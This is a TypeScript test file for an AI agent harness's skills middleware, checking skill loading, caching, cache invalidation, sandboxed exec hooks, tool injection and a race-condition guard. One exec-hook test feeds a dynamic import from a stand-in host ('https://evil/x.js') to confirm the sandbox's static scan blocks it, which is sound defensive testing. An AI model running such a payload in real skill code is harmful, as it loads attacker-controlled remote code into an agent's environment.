import { createSkillsMiddleware, defineSkill, type SkillsController } from '../../harness/skills';
import { createInitialState as createState } from '../../harness/state'

// tsx 运行时由 node 提供 process;tsc 静态检查无 @types/node,显式声明其类型
import type { TestCtx } from './_ctx'

// skills 中间件
export async function run(ctx: TestCtx): Promise<void> {
  const { assert, invoke } = ctx;
  console.log('\n[skills middleware]')
  {
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'demo', description: '演示', getContent: () => 'SKILL FULL CONTENT' }),
    ])
    const seg = mw.augmentPrompt?.(createState())
    assert(seg?.includes('demo') && /Skills/.test(seg || ''), 'skills 索引注入 system prompt')

    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    let r = await invoke(ls, { name: 'demo' })
    assert(/SKILL FULL CONTENT/.test(r), 'load_skill 返回全文')

    r = await invoke(ls, { name: 'demo' })
    assert(/已在本轮加载|无需重复/.test(r), 'load_skill 重复加载被防')

    r = await invoke(ls, { name: 'nope' })
    assert(/未找到/.test(r), 'load_skill 未知名报错')
  }

  console.log('\n[skills middleware 全文缓存 + 跨轮重新 load]')
  {
    // 用计数器验证 getContent 只调一次(缓存命中后不再调)
    let getContentCalls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'cached', description: '缓存测试', getContent: () => { getContentCalls++; return 'CACHED CONTENT ' + getContentCalls } }),
    ])
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    // 首次 load → getContent 调一次,返回内容含计数 1
    let r = await invoke(ls, { name: 'cached' })
    assert(getContentCalls === 1 && /CACHED CONTENT 1/.test(r), '首次 load_skill → getContent 调一次,返回首次内容')
    // 同轮再 load → 被拦截(loaded Set)
    r = await invoke(ls, { name: 'cached' })
    assert(/已在本轮加载|无需重复/.test(r) && getContentCalls === 1, '同轮再 load → 被 loaded 拦截,getContent 不再调')
    // 模拟跨轮:beforeAgent 清 loaded Set,允许重新 load,但用缓存(getContent 不再调)
    ;(mw as any).beforeAgent?.(createState())
    r = await invoke(ls, { name: 'cached' })
    assert(/CACHED CONTENT 1/.test(r) && getContentCalls === 1, '跨轮 beforeAgent 清 loaded → 允许重新 load,但用缓存(getContent 不再调,返回首次内容)')
  }

  console.log('\n[skills controller.set/invalidateCache → 动态替换同名 skill]')
  {
    let getContentCalls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'dyn', description: 'v1', getContent: () => { getContentCalls++; return 'V1 ' + getContentCalls } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    assert(ctrl && typeof ctrl.set === 'function' && typeof ctrl.get === 'function' && typeof ctrl.invalidateCache === 'function' && typeof ctrl.getContent === 'function', 'controller 暴露 set/get/invalidateCache/getContent')
    assert(ctrl.get().length === 1 && ctrl.get()[0].description === 'v1', 'controller.get 返回初始 skill')
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    let r = await invoke(ls, { name: 'dyn' })
    assert(/V1 1/.test(r) && getContentCalls === 1, '首次 load v1 → getContent 调一次')
    // 同名 skill 替换为 v2(getContent 返回不同内容)
    let v2Calls = 0
    ctrl.set([defineSkill({ name: 'dyn', description: 'v2', getContent: () => { v2Calls++; return 'V2 ' + v2Calls } })])
    assert(ctrl.get().length === 1 && ctrl.get()[0].description === 'v2', 'controller.set → get 返回 v2')
    // set 已清 contentCache + loaded,直接 load 取 v2 全文
    r = await invoke(ls, { name: 'dyn' })
    assert(/V2 1/.test(r) && v2Calls === 1, 'setSkills 同名替换 → 清缓存,下次 load 取 v2 全文(getContent 重新调一次)')
    // augmentPrompt 反映新 skill 索引
    const idx = (mw as any).augmentPrompt?.() as string
    assert(/v2/.test(idx) && !/v1/.test(idx), 'augmentPrompt 反映 setSkills 后的 v2 索引')
  }

  console.log('\n[skills controller.invalidateCache → 指定/全部清缓存]')
  {
    let c1Calls = 0, c2Calls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'a', description: 'A', getContent: () => { c1Calls++; return 'A' + c1Calls } }),
      defineSkill({ name: 'b', description: 'B', getContent: () => { c2Calls++; return 'B' + c2Calls } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    await invoke(ls, { name: 'a' })
    await invoke(ls, { name: 'b' })
    assert(c1Calls === 1 && c2Calls === 1, '两个 skill 各 load 一次,getContent 各调一次')
    ;(mw as any).beforeAgent?.(createState())  // 清 loaded 允许重 load
    // 仅清 a 的缓存
    ctrl.invalidateCache('a')
    let r = await invoke(ls, { name: 'a' })
    assert(/A2/.test(r) && c1Calls === 2, 'invalidateCache(a) → a 重新 getContent,b 仍用缓存')
    r = await invoke(ls, { name: 'b' })
    ;(mw as any).beforeAgent?.(createState())
    assert(/B1/.test(r) && c2Calls === 1, 'b 仍命中缓存(getContent 不再调)')
    // 全清
    ctrl.invalidateCache()
    ;(mw as any).beforeAgent?.(createState())
    await invoke(ls, { name: 'a' })
    r = await invoke(ls, { name: 'b' })
    assert(/B2/.test(r) && c1Calls === 3 && c2Calls === 2, 'invalidateCache() 全清 → a/b 都重新 getContent(a=3 次,b=2 次)')
  }

  console.log('\n[skills controller.getContent → 读取 skill 全文(缓存优先)]')
  {
    let calls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'doc', description: '文档', getContent: () => { calls++; return `DOC ${calls}` } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    // 首次 getContent → 调一次 getContent,缓存
    let c = await ctrl.getContent('doc')
    assert(c === 'DOC 1' && calls === 1, 'getContent 首次 → 调 getContent 一次,返回内容并缓存')
    // 再次 → 命中缓存,不调 getContent
    c = await ctrl.getContent('doc')
    assert(c === 'DOC 1' && calls === 1, 'getContent 再次 → 命中缓存,getContent 不再调,返回首次内容')
    // 不存在的 skill → null
    c = await ctrl.getContent('nope')
    assert(c === null, 'getContent 不存在的 skill → 返回 null')
    // setSkills 替换后缓存清空 → 重新 getContent 调一次
    let calls2 = 0
    ctrl.set([defineSkill({ name: 'doc', description: 'v2', getContent: () => { calls2++; return `DOC2 ${calls2}` } })])
    c = await ctrl.getContent('doc')
    assert(c === 'DOC2 1' && calls2 === 1, 'setSkills 同名替换 → 清缓存,getContent 重新调一次取新内容')
    // invalidateCache 后 → 重新 getContent 调一次
    ctrl.invalidateCache('doc')
    c = await ctrl.getContent('doc')
    assert(c === 'DOC2 2' && calls2 === 2, 'invalidateCache(doc) → getContent 重新调一次取最新')
  }

  console.log('\n[skills exec 钩子 · skill-external-scripts §3/§4]')
  {
    const { executeSkillExec } = await import('../../harness/skills')
    // 校验:code/url 都空
    let r = await executeSkillExec({} as any)
    assert(!r.ok && /未提供 code 或 url/.test(r.error), '✓ executeSkillExec:code/url 都空 → 失败')
    // 校验:code+url 都填
    r = await executeSkillExec({ code: 'return 1', url: 'http://x' } as any)
    assert(!r.ok && /不能同时提供/.test(r.error), '✓ executeSkillExec:code+url 都填 → 失败(二选一)')
    // 4.1.0:host 上下文已移除 —— 残值 'host' 落 sandbox 执行(宿主全权降级沙箱,语义反转)。
    // 正向执行仅 Worker 可用环境可测(node 无 Worker,与 sec-21/sec-79 约定一致)
    if (typeof Worker !== 'undefined') {
      r = await executeSkillExec({ code: 'return 41 + 1', context: 'host' } as any)
      assert(r.ok && r.text === '42', '✓ executeSkillExec:残值 host → 落 sandbox 执行返回结果(语义反转)')
    }
    // sandbox 静态扫描拒绝(命中即 return,不创建 Worker,node 可测)
    r = await executeSkillExec({ code: 'return import("https://evil/x.js")', context: 'sandbox' })
    assert(!r.ok && /禁用模式/.test(r.error), '✓ executeSkillExec:sandbox 静态扫描拒绝动态 import()')
  }

  console.log('\n[skills buildSkillContent · exec 注入 + 失败不缓存]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    // exec 成功 → 注入 + 缓存(正向执行仅 Worker 可用环境;node 无 Worker 跳过,sec-21/sec-79 同约定)
    let loadCalls = 0
    const mw1 = createSkillsMiddleware(
      [defineSkill({ name: 'dyn', description: '动态', getContent: () => { loadCalls++; return 'BASE ' + loadCalls }, exec: { code: 'return "LIVE:"+(40+2)' } })],
    )
    const ls1 = mw1.tools!.find((x) => x.name === 'load_skill')!
    let rr = await ls1.invoke({ name: 'dyn' })
    if (typeof Worker !== 'undefined') {
      assert(/BASE 1/.test(rr) && /LIVE:42/.test(rr), '✓ buildSkillContent:exec 成功 → 实时数据注入全文(BASE + LIVE)')
      // exec 成功缓存:跨轮 beforeAgent 清 loaded → 用缓存(exec + getContent 都不重跑)
      ;(mw1 as any).beforeAgent()
      loadCalls = 0
      rr = await ls1.invoke({ name: 'dyn' })
      assert(/BASE 1/.test(rr) && loadCalls === 0, '✓ exec 成功缓存:跨轮用缓存(exec + getContent 都不重跑)')
    }

    // exec 失败 → 标注 + 不缓存(下次 load 重试)
    const mw2 = createSkillsMiddleware(
      [defineSkill({ name: 'fail', description: '失败', getContent: () => 'FAILBASE', exec: { code: 'throw new Error("boom")' } })],
    )
    const ls2 = mw2.tools!.find((x) => x.name === 'load_skill')!
    rr = await ls2.invoke({ name: 'fail' })
    assert(/FAILBASE/.test(rr) && /脚本执行失败/.test(rr), '✓ exec 失败 → 文本可用 + 标注失败原因(不阻塞)')
    // 失败不缓存:跨轮重新 load → exec 重试
    ;(mw2 as any).beforeAgent()
    rr = await ls2.invoke({ name: 'fail' })
    assert(/脚本执行失败/.test(rr), '✓ exec 失败不缓存:跨轮重新 load → 重新执行 exec(动态 skill 可重试)')

    // inject prepend → 实时数据在文本前
    const mw3 = createSkillsMiddleware(
      [defineSkill({ name: 'pre', description: '前插', getContent: () => 'TAIL', exec: { code: 'return "HEAD"', inject: 'prepend' } })],
    )
    const ls3 = mw3.tools!.find((x) => x.name === 'load_skill')!
    rr = await ls3.invoke({ name: 'pre' })
    assert(rr.indexOf('HEAD') < rr.indexOf('TAIL'), '✓ exec inject:prepend → 实时数据在文本前')
  }

  console.log('\n[skills tools 注入 · skill-external-scripts §5]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    const { tool } = await import('@langchain/core/tools')
    const { z } = await import('zod')
    let injected: string[] = []
    const fakeTool = tool(async () => 'ok', { name: 'mytool', description: 'd', schema: z.object({}) })
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 't', description: '带工具', getContent: () => 'T', tools: [() => fakeTool] })],
      { onToolsReady: (_n, ts) => { injected = ts.map((x: any) => x.name) } },
    )
    await (mw.tools!.find((x) => x.name === 'load_skill')!).invoke({ name: 't' })
    assert(injected.includes('mytool'), '✓ skill tools:load_skill 后 onToolsReady 触发,工具注入回调收到工具')
    // 无 tools 的 skill 不触发
    injected = []
    const mw2 = createSkillsMiddleware([defineSkill({ name: 'plain', description: '无工具', getContent: () => 'P' })], { onToolsReady: (_n, ts) => { injected = ts.map((x: any) => x.name) } })
    await (mw2.tools!.find((x) => x.name === 'load_skill')!).invoke({ name: 'plain' })
    assert(injected.length === 0, '✓ skill tools:无 tools 的 skill 不触发 onToolsReady')
  }

  console.log('\n[skill exec 空结果不缓存 · 审查修复(低2)]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    ;(globalThis as any).__cnt = 0
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 'empty', description: '空结果', getContent: () => 'B', exec: { code: 'globalThis.__cnt++; return ""' } })],
    )
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    await ls.invoke({ name: 'empty' })  // exec 跑(node 下 Worker 不可用失败;成功返回空 → cacheable false)→ 均不缓存
    ;(mw as any).beforeAgent()  // 跨轮清 loaded
    await ls.invoke({ name: 'empty' })  // 未缓存 → 重跑 exec(成功空结果 __cnt=2;node 下失败重试 __cnt=0 恒不缓存)
    const cnt = (globalThis as any).__cnt
    if (typeof Worker !== 'undefined') {
      assert(cnt === 2, '✓ exec 空结果不缓存:跨轮重新 load → exec 重跑(__cnt=2,非缓存命中)')
    } else {
      assert(cnt === 0, '✓ exec 失败不缓存(node 无 Worker):跨轮重新 load → exec 重试(恒不缓存)')
    }
    delete (globalThis as any).__cnt
  }

  console.log('\n[load_skill TOCTOU · await 期间 skill 替换不注入孤立工具 · 审查修复(中1)]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    const { tool } = await import('@langchain/core/tools')
    const { z } = await import('zod')
    let resolveGC!: () => void
    const gcPromise = new Promise<string>((r) => { resolveGC = () => r('BASE') })
    let onToolsCalled = false
    const fakeTool = tool(async () => 'ok', { name: 'stale__t', description: 'd', schema: z.object({}) })
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 'stale', description: '工具', getContent: () => gcPromise, tools: [() => fakeTool] })],
      { onToolsReady: () => { onToolsCalled = true } },
    )
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    const loadP = ls.invoke({ name: 'stale' })  // 触发,getContent pending(await 中)
    // await 期间 setSkills 替换(stale 不再注册)→ 模拟 load_skill await 时 skill 被替换
    ;(mw as any).controller.set([defineSkill({ name: 'other', description: 'o', getContent: () => 'O' })])
    resolveGC()  // getContent resolve → load_skill 继续,但 skillMap.get('stale') !== s → 不调 onToolsReady
    await loadP
    assert(!onToolsCalled, '✓ TOCTOU:load_skill await 期间 skill 被 setSkills 替换 → onToolsReady 不注入孤立工具(skillMap.get(name)===s 守卫)')
  }

}
